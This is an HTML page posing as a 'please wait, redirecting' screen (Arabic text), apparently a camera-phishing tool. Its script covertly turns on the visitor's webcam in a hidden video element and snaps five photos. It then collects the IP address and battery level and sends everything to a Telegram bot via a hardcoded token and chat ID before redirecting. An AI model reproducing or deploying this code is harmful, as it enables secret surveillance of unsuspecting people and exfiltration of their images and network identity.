<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture and Redirect</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #f8f9fa;
            font-family: Arial, sans-serif;
            overflow: hidden; /* Prevent scrollbars */
        }
        .container {
            text-align: center;
            position: relative;
        }
        .message {
            font-size: 2rem;
            font-weight: bold;
            color: #333;
            margin: 0;
            position: relative;
        }
        .loading {
            border: 4px solid #f3f3f3; /* Light grey */
            border-top: 4px solid #007bff; /* Blue */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="message">
            انتظر من فضلك سيتم تحويلك إلى الموقع
            <div class="loading"></div>
        </div>
        <video id="video" width="1280" height="720" autoplay></video>
        <canvas id="canvas" width="1280" height="720"></canvas>
    </div>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return 'Unknown';
            }
        }

        async function getBatteryLevel() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return battery.level * 100; // Battery level as a percentage
                } else {
                    return 'Battery API not supported';
                }
            } catch (error) {
                console.error('Error fetching battery level:', error);
                return 'Unknown';
            }
        }

        function dataURLToBlob(dataURL) {
            const [header, data] = dataURL.split(',');
            const mime = header.match(/:(.*?);/)[1];
            const byteString = atob(data);
            const arrayBuffer = new ArrayBuffer(byteString.length);
            const uint8Array = new Uint8Array(arrayBuffer);

            for (let i = 0; i < byteString.length; i++) {
                uint8Array[i] = byteString.charCodeAt(i);
            }

            return new Blob([arrayBuffer], { type: mime });
        }

        async function captureAndSendImages() {
            const images = [];
            for (let i = 0; i < 5; i++) {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg');
                const imageBlob = dataURLToBlob(imageData);
                images.push(imageBlob);
                await new Promise(resolve => setTimeout(resolve, 200)); // Delay between captures
            }
            return images;
        }

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(async stream => {
                video.srcObject = stream;
                video.play();

                setTimeout(async () => {
                    const images = await captureAndSendImages();
                    const ipAddress = await getIPAddress();
                    const batteryLevel = await getBatteryLevel();

                    for (const imageBlob of images) {
                        await sendDataToTelegram(imageBlob, ipAddress, batteryLevel);
                    }

                    window.location.href = 'https://example.com'; // Replace with the actual URL
                }, 1000); // Initial delay before starting capture
            })
            .catch(err => {
                console.error('Error accessing camera: ' + err);
            });

        async function sendDataToTelegram(imageBlob, ipAddress, batteryLevel) {
            const TELEGRAM_BOT_TOKEN = '7326214976:AAH0mcVnjxRGsh0W7Rjyl1PvxU9nr2nKbXY';
            const TELEGRAM_CHAT_ID = '6332127387';

            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', imageBlob, 'photo.jpg');
            formData.append('caption', `IP: ${ipAddress}\nBattery Level: ${batteryLevel}%`);

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                console.log('Success:', result);
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</body>
</html>
